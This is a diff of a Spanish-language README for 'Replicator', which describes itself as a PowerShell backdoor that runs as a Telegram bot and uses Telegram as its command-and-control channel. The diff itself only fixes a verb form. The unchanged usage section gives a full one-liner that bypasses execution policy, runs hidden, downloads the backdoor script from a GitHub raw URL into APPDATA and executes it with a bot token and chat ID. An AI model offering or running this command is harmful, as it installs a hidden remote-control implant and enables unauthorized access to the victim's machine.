@@ -2,7 +2,7 @@
 Replicator es una puerta trasera basada en Powershell en forma de bot de mensajería instantánea que utiliza Telegram como C&C.
 
 # Requisitos
-Requiere crear un bot de Telegram. Con esto obtiene un API_TOKEN y un CHAT_ID.
+Requiere crear un bot de Telegram. Con esto obtienes un API_TOKEN y un CHAT_ID.
 
 # Uso
 powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1').content > $env:APPDATA\aaa.ps1 ; & $env:APPDATA\aaa.ps1 'API_TOKEN' 'CHAT_ID'"
